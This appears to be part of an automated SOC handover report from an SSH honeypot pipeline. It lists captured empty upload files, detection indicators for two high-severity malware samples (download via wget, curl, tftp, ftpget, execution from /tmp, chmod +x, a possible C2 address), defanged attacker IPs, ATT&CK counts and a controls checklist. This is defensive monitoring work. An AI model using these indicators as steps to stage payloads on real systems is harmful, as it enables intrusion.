| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `181.119.64[.]79` | CO | UFINET COLOMBIA, S. A. | **100** ⚠️ | 5 |
| `218.248.19[.]102` | IN | The Principal | **100** ⚠️ | 50 |
| `91.222.42[.]14` | UA | Totalnet LLC | **100** ⚠️ | 3 |
| `201.28.234[.]10` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 3 |
| `61.145.250[.]147` | CN | CHINANET Guangdong Province Network | **100** ⚠️ | 2 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 6 |
| `181.87.154[.]121` | AR | Telecom Personal Bs As | **100** ⚠️ | 2 |
| `93.171.242[.]207` | UA | ALFA TELECOM s.r.o. | **100** ⚠️ | 2 |
| `112.94.5[.]43` | CN | United-Communications-Network-Technology-Co-Ltd, GuangZhou | **100** ⚠️ | 50 |
| `196.188.187[.]85` | ET | Ethio Telecom | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 102 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 23 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 22 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |

---

## 🔕 False Positive Summary (9 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 221 cases |
| Tool 34  | Credential Extractor        | ✅ 117 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 11 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 77 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (4.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 59 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 17 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 101 priority case(s) shown individually · 26 recon entry/entries in table (9 group(s) consolidating 94 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-23T20:28:15Z_
